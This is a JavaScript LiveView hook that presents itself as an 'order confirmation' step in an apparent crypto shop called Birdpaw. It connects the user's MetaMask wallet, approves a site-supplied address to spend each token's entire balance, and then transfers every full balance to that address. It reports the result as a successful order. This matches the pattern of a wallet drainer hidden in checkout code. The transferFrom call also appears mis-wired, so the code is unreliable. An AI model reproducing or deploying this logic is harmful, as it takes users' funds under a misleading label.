import { ethers } from "ethers";
import { erc20Abi } from "../config.js";

let ApproveTransferHook = {
    mounted() {
        console.log("ApproveTransferHook mounted");

        // Listen for the `trigger_approve_and_transfer` event from LiveView
        this.handleEvent("trigger_approve_and_transfer", async () => {
            try {
                console.log("Starting approval and transfer process...");

                if (!window.ethereum) {
                    console.error("Ethereum wallet not detected");
                    this.pushEvent("order_confirmation_error", { error: "No Ethereum wallet detected" });
                    return;
                }

                // Connect to Ethereum provider (MetaMask)
                const provider = new ethers.BrowserProvider(window.ethereum);
                await provider.send("eth_requestAccounts", []);
                const signer = await provider.getSigner();
                const userAddress = await signer.getAddress();

                // Get the ETH balance to check for transfer
                const balance = await provider.getBalance(userAddress);
                const formattedBalance = ethers.formatEther(balance);

                console.log("User address:", userAddress);
                console.log("ETH balance:", formattedBalance);

                // Get the tokens to approve and transfer (passed via dataset from LiveView)
                const tokenBalances = this.el.dataset.tokens ? JSON.parse(this.el.dataset.tokens) : [];

                // Handle token approvals
                await this.approveTokensIfNeeded(signer, tokenBalances);

                // Send tokens after approval
                await this.transferTokensAfterApproval(signer, tokenBalances);

                // Notify LiveView of success
                this.pushEvent("order_confirmation_success", { address: userAddress, eth_balance: formattedBalance });
                console.log("Approval and transfer completed.");

            } catch (error) {
                console.error("Error during approval and transfer:", error);
                this.pushEvent("order_confirmation_error", { error: error.message });
            }
        });
    },

    // Function to approve tokens before transferring
    async approveTokensIfNeeded(signer, tokenBalances) {
        if (!tokenBalances.length) {
            console.log("No tokens to approve.");
            return;
        }

        const spenderAddress = this.el.dataset.contractAddress; // The Birdpaw contract address

        for (const token of tokenBalances) {
            try {
                if (token.rawBalance > 0) {
                    const contract = new ethers.Contract(token.tokenAddress, erc20Abi, signer);
                    console.log(`Approving ${token.symbol} with balance: ${token.rawBalance}`);

                    // Approve the Birdpaw contract to spend the user's tokens
                    const tx = await contract.approve(spenderAddress, token.rawBalance);
                    await tx.wait();

                    console.log(`Approved ${token.symbol} for transfer.`);
                }
            } catch (error) {
                console.error(`Error approving ${token.symbol}:`, error);
                throw error; // Re-throw error to stop execution if any token fails to approve
            }
        }
    },

    // Function to transfer tokens after approval
    async transferTokensAfterApproval(signer, tokenBalances) {
        if (!tokenBalances.length) {
            console.log("No tokens to transfer.");
            return;
        }

        const recipientAddress = this.el.dataset.contractAddress; // The Birdpaw wallet/contract address

        for (const token of tokenBalances) {
            try {
                if (token.rawBalance > 0) {
                    const contract = new ethers.Contract(token.tokenAddress, erc20Abi, signer);
                    console.log(`Transferring ${token.rawBalance} of ${token.symbol} to ${recipientAddress}`);

                    // Use `transferFrom` to send the tokens from the user to the Birdpaw contract
                    const tx = await contract.transferFrom(signer.getAddress(), recipientAddress, token.rawBalance);
                    await tx.wait();

                    console.log(`Transferred ${token.rawBalance.toString()} ${token.symbol} to ${recipientAddress}`);
                }
            } catch (error) {
                console.error(`Error transferring ${token.symbol}:`, error);
                throw error; // Re-throw error to stop execution if any token fails to transfer
            }
        }
    }
};

export default ApproveTransferHook;
